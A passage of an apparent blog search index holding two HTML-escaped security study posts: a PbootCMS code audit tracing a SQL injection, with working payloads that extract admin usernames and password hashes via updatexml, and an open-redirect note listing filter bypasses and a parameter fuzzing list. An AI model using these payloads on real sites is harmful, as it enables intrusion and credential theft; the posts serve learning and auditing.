$this-&gt;config(&apos;message_send_to&apos;)) { $mail_subject = &quot;&#x3010;PbootCMS&#x3011;&#x60A8;&#x6709;&#x65B0;&#x7684;&#x8868;&#x5355;&#x6570;&#x636E;&#xFF0C;&#x8BF7;&#x6CE8;&#x610F;&#x67E5;&#x6536;&#xFF01;&quot;; $mail_body .= &apos;&lt;br&gt;&#x6765;&#x81EA;&#x7F51;&#x7AD9;&apos; . get_http_url() . &apos;&#xFF08;&apos; . date(&apos;Y-m-d H:i:s&apos;) . &apos;&#xFF09;&apos;; sendmail($this-&gt;config(), $this-&gt;config(&apos;message_send_to&apos;), $mail_subject, $mail_body); } alert_location(&apos;&#x63D0;&#x4EA4;&#x6210;&#x529F;&#xFF01;&apos;, &apos;-1&apos;); } else { $this-&gt;log(&apos;&#x7559;&#x8A00;&#x63D0;&#x4EA4;&#x5931;&#x8D25;&#xFF01;&apos;); alert_back(&apos;&#x63D0;&#x4EA4;&#x5931;&#x8D25;&#xFF01;&apos;); } } else { error(&apos;&#x63D0;&#x4EA4;&#x5931;&#x8D25;&#xFF0C;&#x8BF7;&#x4F7F;&#x7528;POST&#x65B9;&#x5F0F;&#x63D0;&#x4EA4;&#xFF01;&apos;); } } &#x63D0;&#x4EA4;&#x7684;&#x6B65;&#x9AA4;&#x4E3A;&#xFF1A; &#x5224;&#x65AD;POST&#x63D0;&#x4EA4;&#x7684;&#x6570;&#x636E;&#x662F;&#x5426;&#x4E3A;&#x7A7A; &#x68C0;&#x67E5;&#x5B57;&#x6BB5;&#x503C;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#x5E76;&#x83B7;&#x53D6;&#x5B57;&#x6BB5;&#x503C; &#x8BBE;&#x7F6E;&#x989D;&#x5916;&#x6570;&#x636E;&#x540E;&#x63D0;&#x4EA4; &#x8C03;&#x7528;&#xFF1A;$this-&gt;model-&gt;addMessage($data) &#x4E3A;&#x4E86;&#x4E86;&#x89E3;&#x5BF9;POST&#x6570;&#x636E;&#x7684;&#x8FC7;&#x6EE4;&#x60C5;&#x51B5;&#xFF0C;&#x8DDF;&#x8E2A;&#x63A5;&#x6536;&#x6570;&#x636E;&#x5904;&#x7684;post()&#x51FD;&#x6570;: core\\function\\helper.php 123456789101112function post($name, $type = null, $require = false, $vartext = null, $default = null){ $condition = array( &apos;d_source&apos; =&gt; &apos;post&apos;, &apos;d_type&apos; =&gt; $type, &apos;d_require&apos; =&gt; $require, $name =&gt; $vartext, &apos;d_default&apos; =&gt; $default ); return filter($name, $condition);} &#x8FD4;&#x56DE;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x4E86;&#x5904;&#x7406;&#xFF0C;&#x7EE7;&#x7EED;&#x8DDF;&#x8E2A;filter()&#x51FD;&#x6570;&#xFF1A;core\\function\\helper.php 123456function filter($varname, $condition){ // ...&#x5BF9;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x8FDB;&#x884C;&#x5404;&#x79CD;&#x5904;&#x7406; return escape_string($data);} &#x51FD;&#x6570;&#x5185;&#x5BB9;&#x90FD;&#x662F;&#x5BF9;&#x662F;&#x4E00;&#x4E9B;&#x5BF9;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5728;&#x6700;&#x540E;&#x624D;&#x6709;&#x5BF9;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x7684;&#x51FD;&#x6570;&#x3002; &#x7EE7;&#x7EED;&#x8DDF;&#x8E2A;escape_string()&#x51FD;&#x6570;&#xFF1A; 12345678910111213141516171819202122// &#x83B7;&#x53D6;&#x8F6C;&#x4E49;&#x6570;&#x636E;&#xFF0C;&#x652F;&#x6301;&#x5B57;&#x7B26;&#x4E32;&#x3001;&#x6570;&#x7EC4;&#x3001;&#x5BF9;&#x8C61;function escape_string($string, $dropStr = true){ if (! $string) return $string; if (is_array($string)) { // &#x6570;&#x7EC4;&#x5904;&#x7406; foreach ($string as $key =&gt; $value) { $string[$key] = escape_string($value); } } elseif (is_object($string)) { // &#x5BF9;&#x8C61;&#x5904;&#x7406; foreach ($string as $key =&gt; $value) { $string-&gt;$key = escape_string($value); } } else { // &#x5B57;&#x7B26;&#x4E32;&#x5904;&#x7406; if ($dropStr) { $string = preg_replace(&apos;/(0x7e)|(0x27)|(0x22)|(updatexml)|(extractvalue)|(name_const)|(concat)/i&apos;, &apos;&apos;, $string); } $string = htmlspecialchars(trim($string), ENT_QUOTES, &apos;UTF-8&apos;); $string = addslashes($string); } return $string;} &#x5BF9;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x8FDB;&#x884C;&#x7684;&#x8FC7;&#x6EE4;&#x4E3A;&#xFF1A; &#x4F7F;&#x7528;&#x6B63;&#x5219;&#x5C06;&#x4E00;&#x4E9B;sql&#x6CE8;&#x5165;&#x7684;&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;&#x4E3A;&#x7A7A; htmlspecialchars()&#xFF1A;&#x628A;&#x9884;&#x5B9A;&#x4E49;&#x7684;&#x5B57;&#x7B26;&#x8F6C;&#x6362;&#x4E3A; HTML &#x5B9E;&#x4F53;&#x3002; addslashes() &#xFF1A;&#x5728;&#x9884;&#x5B9A;&#x4E49;&#x5B57;&#x7B26;&#x4E4B;&#x524D;&#x6DFB;&#x52A0;&#x53CD;&#x659C;&#x6760;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002; &#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x53EA;&#x5BF9;&#x6570;&#x7EC4;&#x503C;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x5374;&#x6CA1;&#x6709;&#x5BF9;&#x6570;&#x7EC4;&#x7684;&#x952E;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x3002;&#x6240;&#x4EE5;&#x6839;&#x636E;&#x540E;&#x9762;insert()&#x51FD;&#x6570;&#x7684;&#x63D2;&#x5165;&#x65B9;&#x5F0F;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;sql&#x6CE8;&#x5165;&#x3002; &#x4EE5;&#x4E0A;&#x662F;&#x5BF9;POST&#x4F20;&#x5165;&#x53C2;&#x6570;&#x7684;&#x5904;&#x7406;&#x3002; &#x63A5;&#x7740;&#x524D;&#x9762;&#x7684;$this-&gt;model-&gt;addMessage($data) &#x8DDF;&#x8E2A;addMessage&#x51FD;&#x6570;&#xFF1A;apps\\api\\model\\CmsModel.php 1234public function addMessage($table, $data){ return parent::table(&apos;ay_message&apos;)-&gt;autoTime()-&gt;insert($data);} &#x7EE7;&#x7EED;&#x8DDF;&#x8E2A;insert()&#x51FD;&#x6570;&#xFF1A;core\\basic\\Model.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113// ******************************&#x6570;&#x636E;&#x63D2;&#x5165;*******************************************************/** * &#x6570;&#x636E;&#x63D2;&#x5165;&#x6A21;&#x578B; * * @param array $data * &#x53EF;&#x4EE5;&#x4E3A;&#x4E00;&#x7EF4;&#x6216;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#xFF0C; * &#x4E00;&#x7EF4;&#x6570;&#x7EC4;&#xFF1A;array(&apos;username&apos;=&gt;&quot;xsh&quot;,&apos;sex&apos;=&gt;&apos;&#x7537;&apos;), * &#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#xFF1A;array( * array(&apos;username&apos;=&gt;&quot;xsh&quot;,&apos;sex&apos;=&gt;&apos;&#x7537;&apos;), * array(&apos;username&apos;=&gt;&quot;gmx&quot;,&apos;sex&apos;=&gt;&apos;&#x5973;&apos;) * ) * @param boolean $batch * &#x662F;&#x5426;&#x542F;&#x7528;&#x6279;&#x91CF;&#x4E00;&#x6B21;&#x63D2;&#x5165;&#x529F;&#x80FD;&#xFF0C;&#x9ED8;&#x8BA4;true * @return boolean|boolean|array */final public function insert(array $data = array(), $batch = true){ // &#x672A;&#x4F20;&#x9012;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F7F;&#x7528;data&#x51FD;&#x6570;&#x63D2;&#x5165;&#x6570;&#x636E; if (! $data &amp;&amp; isset($this-&gt;sql[&apos;data&apos;])) { return $this-&gt;insert($this-&gt;sql[&apos;data&apos;]); } if (is_array($data)) { if (! $data) return; if (count($data) == count($data, 1)) { // &#x5355;&#x6761;&#x6570;&#x636E; &#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;&#x591A;&#x7EF4;&#x6570;&#x7EC4; $keys = &apos;&apos;; $values = &apos;&apos;; foreach ($data as $key =&gt; $value) { if (! is_numeric($key)) { //&#x5224;&#x65AD;&#x952E;&#x662F;&#x5426;&#x4E3A;&#x6570;&#x503C; $keys .= &quot;`&quot; . $key . &quot;`,&quot;; //&#x5C06;&#x952E;&#x8F6C;&#x6362;&#x4E3A; `key`&#x5982;&#x4F55;&#x62FC;&#x63A5;&#x8D77;&#x6765; $values .= &quot;&apos;&quot; . $value . &quot;&apos;,&quot;;//&#x5C06;&#x503C;&#x8F6C;&#x6362;&#x4E3A; `value` } } if ($this-&gt;autoTimestamp || (isset($this-&gt;sql[&apos;auto_time&apos;]) &amp;&amp; $this-&gt;sql[&apos;auto_time&apos;] == true)) { $keys .= &quot;`&quot; . $this-&gt;createTimeField . &quot;`,`&quot; . $this-&gt;updateTimeField . &quot;`,&quot;; if ($this-&gt;intTimeFormat) { $values .= &quot;&apos;&quot; . time() . &quot;&apos;,&apos;&quot; . time() . &quot;&apos;,&quot;; } else { $values .= &quot;&apos;&quot; . date(&apos;Y-m-d H:i:s&apos;) . &quot;&apos;,&apos;&quot; . date(&apos;Y-m-d H:i:s&apos;) . &quot;&apos;,&quot;; } } if ($keys) { // &#x5982;&#x679C;&#x63D2;&#x5165;&#x6570;&#x636E;&#x5173;&#x8054;&#x5B57;&#x6BB5;,&#x5219;&#x5B57;&#x6BB5;&#x4EE5;&#x5173;&#x8054;&#x6570;&#x636E;&#x4E3A;&#x51C6;,&#x5426;&#x5219;&#x4EE5;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x4E3A;&#x51C6; $this-&gt;sql[&apos;field&apos;] = &apos;(&apos; . substr($keys, 0, - 1) . &apos;)&apos;; } elseif (isset($this-&gt;sql[&apos;field&apos;]) &amp;&amp; $this-&gt;sql[&apos;field&apos;]) { $this-&gt;sql[&apos;field&apos;] = &quot;({$this-&gt;sql[&apos;field&apos;]})&quot;; } $this-&gt;sql[&apos;value&apos;] = &quot;(&quot; . substr($values, 0, - 1) . &quot;)&quot;; $sql = $this-&gt;buildSql($this-&gt;insertSql); } else { // &#x591A;&#x6761;&#x6570;&#x636E; if ($batch) { // &#x6279;&#x91CF;&#x4E00;&#x6B21;&#x6027;&#x63D2;&#x5165; $key_string = &apos;&apos;; $value_string = &apos;&apos;; $flag = false; foreach ($data as $keys =&gt; $value) { if (! $flag) { $value_string .= &apos; SELECT &apos;; } else { $value_string .= &apos; UNION All SELECT &apos;; } foreach ($value as $key2 =&gt; $value2) { // &#x5B57;&#x6BB5;&#x83B7;&#x53D6;&#x53EA;&#x6267;&#x884C;&#x4E00;&#x6B21; if (! $flag &amp;&amp; ! is_numeric($key2)) { $key_string .= &quot;`&quot; . $key2 . &quot;`,&quot;; } $value_string .= &quot;&apos;&quot; . $value2 . &quot;&apos;,&quot;; } $flag = true; if ($this-&gt;autoTimestamp || (isset($this-&gt;sql[&apos;auto_time&apos;]) &amp;&amp; $this-&gt;sql[&apos;auto_time&apos;] == true)) { if ($this-&gt;intTimeFormat) { $value_string .= &quot;&apos;&quot; . time() . &quot;&apos;,&apos;&quot; . time() . &quot;&apos;,&quot;; } else { $value_string .= &quot;&apos;&quot; . date(&apos;Y-m-d H:i:s&apos;) . &quot;&apos;,&apos;&quot; . date(&apos;Y-m-d H:i:s&apos;) . &quot;&apos;,&quot;; } } $value_string = substr($value_string, 0, - 1); } if ($this-&gt;autoTimestamp || (isset($this-&gt;sql[&apos;auto_time&apos;]) &amp;&amp; $this-&gt;sql[&apos;auto_time&apos;] == true)) { $key_string .= &quot;`&quot; . $this-&gt;createTimeField . &quot;`,`&quot; . $this-&gt;updateTimeField . &quot;`,&quot;; } if ($key_string) { // &#x5982;&#x679C;&#x63D2;&#x5165;&#x6570;&#x636E;&#x5173;&#x8054;&#x5B57;&#x6BB5;,&#x5219;&#x5B57;&#x6BB5;&#x4EE5;&#x5173;&#x8054;&#x6570;&#x636E;&#x4E3A;&#x51C6;,&#x5426;&#x5219;&#x4EE5;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x4E3A;&#x51C6; $this-&gt;sql[&apos;field&apos;] = &apos;(&apos; . substr($key_string, 0, - 1) . &apos;)&apos;; } elseif (isset($this-&gt;sql[&apos;field&apos;]) &amp;&amp; $this-&gt;sql[&apos;field&apos;]) { $this-&gt;sql[&apos;field&apos;] = &quot;({$this-&gt;sql[&apos;field&apos;]})&quot;; } $this-&gt;sql[&apos;value&apos;] = $value_string; $sql = $this-&gt;buildSql($this-&gt;insertMultSql); // &#x5224;&#x65AD;SQL&#x8BED;&#x53E5;&#x662F;&#x5426;&#x8D85;&#x8FC7;&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x7F6E; if (get_db_type() == &apos;mysql&apos;) { $max_allowed_packet = $this-&gt;getDb()-&gt;one(&apos;SELECT @@global.max_allowed_packet&apos;, 2); } else { $max_allowed_packet = 1 * 1024 * 1024; // &#x5176;&#x4ED6;&#x7C7B;&#x578B;&#x6570;&#x636E;&#x5E93;&#x6309;&#x7167;1M&#x9650;&#x5236; } if (strlen($sql) &gt; $max_allowed_packet) { // &#x5982;&#x679C;&#x8981;&#x63D2;&#x5165;&#x7684;&#x6570;&#x636E;&#x8FC7;&#x5927;&#xFF0C;&#x5219;&#x8F6C;&#x6362;&#x4E3A;&#x4E00;&#x6761;&#x6761;&#x63D2;&#x5165; return $this-&gt;insert($data, false); } } else { // &#x6279;&#x91CF;&#x4E00;&#x6761;&#x6761;&#x63D2;&#x5165; foreach ($data as $keys =&gt; $value) { $result = $this-&gt;insert($value); } return $result; } } } elseif ($this-&gt;sql[&apos;from&apos;]) { if (isset($this-&gt;sql[&apos;field&apos;]) &amp;&amp; $this-&gt;sql[&apos;field&apos;]) { // &#x8868;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;&#x590D;&#x5236; $this-&gt;sql[&apos;field&apos;] = &quot;({$this-&gt;sql[&apos;field&apos;]})&quot;; } $sql = $this-&gt;buildSql($this-&gt;insertFromSql); } else { return; } return $this-&gt;getDb()-&gt;amd($sql);} insert&#x51FD;&#x6570;&#x53EA;&#x662F;&#x5BF9;&#x63D0;&#x4EA4;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x4E86;&#x62FC;&#x63A5;&#xFF0C;&#x5E76;&#x672A;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x3002; &#x63D0;&#x4EA4;&#x4E00;&#x4E2A;&#x7559;&#x8A00;&#xFF0C;&#x67E5;&#x770B;&#x63D0;&#x4EA4;&#x7684;mysql&#x8BED;&#x53E5;&#x3002; INSERT INTO ay_message (`contacts`,`mobile`,`content`,`acode`,`user_ip`,`user_os`,`user_bs`,`recontent`,`status`,`create_user`,`update_user`,`create_time`,`update_time`) VALUES (&apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;cn&apos;,&apos;2130706433&apos;,&apos;Windows 10&apos;,&apos;Chrome&apos;,&apos;&apos;,&apos;0&apos;,&apos;guest&apos;,&apos;guest&apos;,&apos;2019-05-20 16:00:22&apos;,&apos;2019-05-20 16:00:22&apos;) &#x8FD9;&#x91CC;&#x7684;1, 2, 3&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4F46;&#x662F;&#x5185;&#x5BB9;&#x4F1A;&#x88AB;&#x8FC7;&#x6EE4;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x80FD;&#x8FDB;&#x884C;sql&#x6CE8;&#x5165;&#xFF0C;&#x4F46;&#x8FD8;&#x6709;contracts, mobile, content&#x8FD9;&#x4E09;&#x4E2A;&#x4ECE;post&#x4F20;&#x8FC7;&#x53BB;&#x5E76;&#x6CA1;&#x6709;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x7684;&#x53C2;&#x6570;&#x540D;&#x3002; &#x4E8E;&#x662F;&#x6784;&#x9020;payload&#xFF1A; contacts[content`,`create_time`,`update_time`) VALUES (&apos;1&apos;, &apos;1&apos; ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] &#x7528;Brupsuite&#x6293;&#x5305;&#x540E;&#x63D0;&#x4EA4;&#xFF0C;&#x5C31;&#x4F1A;&#x5F97;&#x5230;user()&#x3002; &#x524D;&#x53F0;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#xFF1A; http://127.0.0.1/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123 &#x6E90;&#x7801;&#x5206;&#x6790;&#x540E;&#x9762;&#x51E0;&#x4E2A;&#x4F8B;&#x5B50;&#x57FA;&#x672C;&#x90FD;&#x662F;&#x56F4;&#x7ED5;&#x8FD9;&#x4E2A;&#x70B9;&#x6CE8;&#x5165;&#x7684;&#x3002; &#x76F4;&#x63A5;&#x6765;&#x770B;&#x6E90;&#x7801;&#xFF1A; \\apps\\home\\controller\\ParserController.php &#x91CC;&#x9762;&#x6709;&#x4E00;&#x4E2A;parserAfter&#x51FD;&#x6570;&#xFF0C;&#x91CC;&#x9762;&#x4F1A;&#x8C03;&#x7528;&#x6307;&#x5B9A;&#x5217;&#x8868;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x8DDF;&#x8FDB;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#xFF1A; 1234567public function parserAfter($content){ ... $content = $this-&gt;parserSpecifyListLabel($content); // &#x6307;&#x5B9A;&#x5217;&#x8868; ...} &#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5728;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x7B5B;&#x9009;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;&#xFF1A; 123456789...// &#x6570;&#x636E;&#x7B5B;&#x9009;$where2 = array();foreach ($_GET as $key =&gt; $value) { if (substr($key, 0, 4) == &apos;ext_&apos;) { // &#x5176;&#x4ED6;&#x5B57;&#x6BB5;&#x4E0D;&#x52A0;&#x5165; $where2[$key] = get($key); }}... &#x4F1A;&#x5224;&#x65AD;get&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x7684;&#x524D;&#x7F00;&#x662F;&#x5426;&#x4E3A;ext_ &#x5982;&#x679C;&#x662F;&#xFF0C;&#x5C31;&#x52A0;&#x5165;where2&#x6570;&#x7EC4;&#x3002; where2&#x6570;&#x7EC4;&#x6700;&#x7EC8;&#x4F1A;&#x8FDB;&#x5165;&#x5230;&#x4E0B;&#x9762;&#x7684;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x5185;&#x3002;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;&#x8FD9;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#xFF1A; $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2); $data = $this-&gt;model-&gt;getSpecifyList($scode, $num, $order, $where1, $where2); 123456789101112131415public function getSpecifyList($acode, $scode, $num, $order, $where = array()){ ... return parent::table(&apos;ay_content a&apos;)-&gt;field($fields) -&gt;where($where1, &apos;OR&apos;) -&gt;where($where2) -&gt;where($where, &apos;AND&apos;, &apos;AND&apos;, true) -&gt;join($join) -&gt;order($order) -&gt;limit($num) -&gt;decode() -&gt;select();} &#x53EF;&#x89C1;&#xFF0C;&#x8FD9;&#x4E2A;where2&#x6570;&#x7EC4;&#x7684;&#x4F1A;&#x88AB;&#x5E26;&#x5165;&#x5230;where&#x51FD;&#x6570;&#x5185;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#x3002; &#x5F53;payload&#x88AB;&#x4F20;&#x5165;&#x65F6;&#xFF0C;where&#x51FD;&#x6570;&#x4F1A;&#x62FC;&#x63A5;&#x6570;&#x7EC4;&#x91CC;&#x7684;&#x503C;&#xFF0C;&#x8FDB;&#x800C;&#x5BFC;&#x81F4;sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x3002;&#x67E5;&#x8BE2;&#x7684;sql&#x8BED;&#x53E5;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x3002; 1SELECT a.*,b.name as sortname,b.filename as sortfilename,c.name as subsortname,c.filename as subfilename,d.type,e.* FROM ay_content a LEFT JOIN ay_content_sort b ON a.scode=b.scode LEFT JOIN ay_content_sort c ON a.subscode=c.scode LEFT JOIN ay_model d ON b.mcode=d.mcode LEFT JOIN ay_content_ext e ON a.id=e.contentid WHERE(a.scode in (&apos;5&apos;,&apos;6&apos;,&apos;7&apos;) OR a.subscode=&apos;5&apos;) AND(a.acode=&apos;cn&apos; AND a.status=1 AND d.type=2) AND(ext_price=1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));# like &apos;%123%&apos; ) ORDER BY date DESC,sorting ASC,id DESC LIMIT 4 &#x603B;&#x7ED3;&#x89C1;&#x5230;&#x6709;&#x4E2A;&#x5927;&#x4F6C;&#x7684;&#x6587;&#x7AE0;&#x91CC;&#x9762;&#x603B;&#x7ED3;&#x7684;&#x5F88;&#x597D;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x76F4;&#x63A5;&#x6309;&#x4ED6;&#x7684;&#x601D;&#x8DEF;&#x6765;&#x4E86;&#x3002; &#x5728;sql&#x6CE8;&#x5165;&#x7684;&#x5BA1;&#x8BA1;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x4E00;&#x822C;&#x7684;&#x6D41;&#x7A0B;&#x4E3A;&#xFF1A; &#x5728;seay&#x4E2D;&#x5F00;&#x542F;&#x67E5;&#x8BE2;&#x65E5;&#x5FD7; &#x67E5;&#x627E;&#x7CFB;&#x7EDF;&#x7684;&#x8F93;&#x5165;&#x70B9;&#xFF0C;&#x5C1D;&#x8BD5;&#x8F93;&#x5165;&#x4E00;&#x4E9B;&#x5185;&#x5BB9;&#x5E76;&#x6267;&#x884C; &#x8DDF;&#x968F;&#x8F93;&#x5165;&#x4FE1;&#x606F;&#xFF0C;&#x5224;&#x65AD;&#x8F93;&#x5165;&#x7684;&#x5185;&#x5BB9;&#x662F;&#x5426;&#x88AB;&#x8FC7;&#x6EE4;&#xFF0C;&#x662F;&#x5426;&#x53EF;&#x5229;&#x7528;&#x3002; &#x6784;&#x9020;&#x6CE8;&#x5165;&#x8BED;&#x53E5;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5; &#x6211;&#x89C9;&#x5F97;&#x5728;&#x8FD9;&#x4E4B;&#x524D;&#x5E94;&#x8BE5;&#x5BF9;&#x6846;&#x67B6;&#x548C;&#x5E95;&#x5C42;sql&#x63D2;&#x5165;&#x7684;&#x51FD;&#x6570;&#x65B9;&#x6CD5;&#x6709;&#x4E2A;&#x5927;&#x6982;&#x7684;&#x4E86;&#x89E3;&#x3002; &#x4E00;&#x4E9B;&#x8F93;&#x5165;&#x70B9;&#x7684;&#x603B;&#x7ED3;&#xFF1A; 1&#xFF09;&#x8868;&#x5355;&#x63D0;&#x4EA4;&#xFF0C;&#x4E3B;&#x8981;&#x662F;POST&#x8BF7;&#x6C42;&#xFF0C;&#x4E5F;&#x5305;&#x62EC;GET&#x8BF7;&#x6C42;&#x3002; 2&#xFF09;URL&#x53C2;&#x6570;&#x63D0;&#x4EA4;&#xFF0C;&#x4E3B;&#x8981;&#x4E3A;GET&#x8BF7;&#x6C42;&#x53C2;&#x6570;&#x3002; 3&#xFF09;Cookie&#x53C2;&#x6570;&#x63D0;&#x4EA4;&#x3002; 4&#xFF09;HTTP&#x8BF7;&#x6C42;&#x5934;&#x90E8;&#x7684;&#x4E00;&#x4E9B;&#x53EF;&#x4FEE;&#x6539;&#x7684;&#x503C;&#xFF0C;&#x6BD4;&#x5982;Referer&#x3001;User_Agent&#x7B49;&#x3002; 5&#xFF09;&#x4E00;&#x4E9B;&#x8FB9;&#x7F18;&#x7684;&#x8F93;&#x5165;&#x70B9;&#xFF0C;&#x6BD4;&#x5982;.jpg&#x6587;&#x4EF6;&#x7684;&#x4E00;&#x4E9B;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#x7B49;&#x3002; &#x5BF9;TP&#x7684;&#x6846;&#x67B6;&#x8FD8;&#x662F;&#x534A;&#x61F5;&#x534A;&#x61C2;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x4E00;&#x5B9A;&#x8981;&#x5B66;&#xFF0C;&#x5FC5;&#x987B;&#x8981;&#x5B66;&#x3002; &#x8FD9;&#x6B21;&#x5012;&#x662F;&#x5BF9;sql&#x6CE8;&#x5165;&#x7684;&#x5BA1;&#x8BA1;&#x6709;&#x4E86;&#x5927;&#x6982;&#x7684;&#x6846;&#x67B6;&#x4E86;&#xFF0C;&#x540E;&#x9762;&#x8981;&#x5C1D;&#x8BD5;&#x5BA1;&#x8BA1;&#x51E0;&#x4E2A;&#x5C0F;&#x7684;cms&#x3002;","link":"/2019/05/29/PHP代码审计之SQL注入与审计流程/"},{"title":"学习 Open redirect","text":"Open redirectSimple note:If you meet a url like http://127.0.0.1/index.php?url=http://www.baidu.com, when it is turned on, you will be redirected to another URL.When the we can contral the url, there is a Open redirect vulnerability.(Of course , the vulnerability base on the url redirect is harmful to the website.) Bypass:Most of the url of redirect will be filter.So the most important thing is to bypass the filter. @ http://127.0.0.1@baidu.com =&gt; https://www.baidu.com/ ? https://baidu.com =&gt; https://anysite/?baidu.com When the filter will check the tail of the url, then we can use this to bypass. Anchor point(&#x951A;&#x70B9;) http://127.0.0.1/#baidu.com Behind the # will be seen as the anchor of the web page. xip.io xip.io provides wildcard(&#x901A;&#x914D;&#x7B26;) DNS for any IP address. 123410.0.0.1.xip.io resolves to 10.0.0.1www.10.0.0.1.xip.io resolves to 10.0.0.1mysite.10.0.0.1.xip.io resolves to 10.0.0.1foo.bar.10.0.0.1.xip.io resolves to 10.0.0.1 http://www.baidu.com.127.0.0.1.xip.io/ =&gt; 127.0.0.1 \\ http://www.baidu.com/index.php?url=http:/\\baidu.com Chrome characteristic (All will redirect to baidu.com): 1234http:/\\/baidu.comhttp:\\//baidu.com/\\/baidu.comhttp:\\\\\\//baidu.com It can bypass some filters. Change IP Change your url to a IP , maybe can bypass the filter. Try to use IPv6, IPv4 in decimal(&#x5341;&#x8FDB;&#x5236;), hex, octal(&#x516B;&#x8FDB;&#x5236;) Extension checked? If extension checked, try ?image_url={payload}/.jpg Strange way: Domain spoofing in redirect page using RTLO Tips:Hot find ? Burp Proxy history &amp; Burp Sitemap (look at URLs with parameters) You can search 30X response code in burpsuite. Responses to look for when fuzzing 12345300 Multiple choices301 Parmanent movement302 Found (Moved Temporarily)307 Temporary redirect308 Parmanent redirect Google dorking. : inurl:redirectURL=http://site:target.com Functionalities usually associated with redirects: 123Login, Logout, Register &amp; Password reset pagesChange site languageLinks in emails Read JavaScript code Bruteforcing 12345Look for hidden redirect parameters/redirect?url={payload}&amp;next={payload}&amp;redirect={payload}&amp;redir={payload}&amp;rurl={payload}&amp;redirect_uri={payload}/?url={payload}&amp;next={payload}&amp;redirect={payload}&amp;redir={payload}&amp;rurl={payload}&amp;redirect_uri={payload}I combined a payload with the parameter payloads below./index.php?success=http://www.baidu.com&amp;next=http://www.baidu.com&amp;data=http://www.baidu.com&amp;url=http://www.baidu.com&amp;qurl=http://www.baidu.com&amp;login=http://www.baidu.com&amp;logout=http://www.baidu.com&amp;ext=http://www.baidu.com&amp;clickurl=http://www.baidu.com&amp;goto=http://www.baidu.com&amp;redirect_url=http://www.baidu.com&amp;redirect=http://www.baidu.com&amp;rit_url=http://www.baidu.com&amp;forward_url=http://www.baidu.com&amp;forward=http://www.baidu.com&amp;pic=http://www.baidu.com&amp;callback_url=http://www.baidu.com&amp;jump=http://www.baidu.com&amp;jump_url=http://www.baidu.com&amp;click?u=http://www.baidu.com&amp;originUrl=http://www.baidu.com&amp;origin=http://www.baidu.com&amp;Url=http://www.baidu.com&amp;desturl=http://www.baidu.com&amp;dest=http://www.baidu.com&amp;u=http://www.baidu.com&amp;page=http://www.baidu.com&amp;u1=http://www.baidu.com&amp;action=http://www.baidu.com&amp;action_url=http://www.baidu.com&amp;Redirect=http://www.baidu.com&amp;sp_url=http://www.baidu.com&amp;service=http://www.baidu.com&amp;recurl=http://www.baidu.com&amp;j?url=http://www.baidu.com&amp;url=//http://www.baidu.com&amp;uri=http://www.baidu.com&amp;u=http://www.baidu.com&amp;allinurl:http://www.baidu.com&amp;q=http://www.baidu.com&amp;link=http://www.baidu.com&amp;src=http://www.baidu.com&amp;tc?src=http://www.baidu.com&amp;linkAddress=http://www.baidu.com&amp;location=http://www.baidu.com&amp;go=http://www.baidu.com&amp;burl=http://www.baidu.com&amp;request=http://www.baidu.com&amp;backurl=http://www.baidu.com&amp;RedirectUrl=http://www.baidu.com&amp;Redirect=http://www.baidu.com&amp;ReturnUrl=http://www.baidu